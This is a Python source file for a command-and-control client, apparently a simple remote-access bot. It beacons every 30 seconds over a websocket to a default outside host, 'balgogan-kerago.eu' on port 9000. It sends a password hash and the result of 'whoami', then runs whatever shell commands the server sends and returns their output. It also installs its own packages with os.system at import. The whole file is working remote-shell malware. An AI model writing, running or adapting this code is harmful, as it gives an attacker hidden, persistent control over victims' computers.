import os
import click
import asyncio
import websockets
import subprocess

from utils import hash_sha256

os.system("python3 -m pip install asyncio click websockets")

def execute_command(cmd: str):
    try:
        splitted = cmd.strip("\n").split(" ")
        if len(splitted) == 2 and splitted[0] == "cd":
            os.chdir(splitted[1])
        else:
            output = subprocess.run(cmd, check=True, text=True, shell=True,
                                    capture_output=True)
            return output.stdout
    except subprocess.CalledProcessError:
        pass
    return ""


class Client:
    def __init__(self, password: str, connection_interval: int):
        self.pass_hash = hash_sha256(password)
        self.connection_interval = connection_interval

    async def connection_loop(self, uri: str):
        while True:
            await self._connect(uri)
            await asyncio.sleep(self.connection_interval)

    async def _connect(self, uri: str):
        try:
            async with websockets.connect(uri) as ws:
                await ws.send(self.pass_hash)
                await ws.send(execute_command("whoami"))

                while True:
                    cmd = await ws.recv()
                    await ws.send(execute_command(cmd))
        except Exception as e:
            print(f"Exception {e} occurred.")


@click.command()
@click.option(
    "--server_address",
    "-s",
    default="balgogan-kerago.eu",
    type=click.STRING,
    help="Ip address or host of a running c&c",
)
@click.option(
    "--port",
    "-p",
    default="9000",
    type=click.INT,
    help="Port where the running c&c listens",
)
@click.option(
    "--connection_interval",
    "-i",
    default="30",
    type=click.INT,
    help="Interval in seconds in which client tries to connect to c&c server",
)
def main(server_address: str, port: int, connection_interval: int):
    client = Client("password", connection_interval)

    uri = f"ws://{server_address}:{port}"

    print("Starting client...")
    asyncio.get_event_loop().run_until_complete(client.connection_loop(uri))


if __name__ == "__main__":
    main()
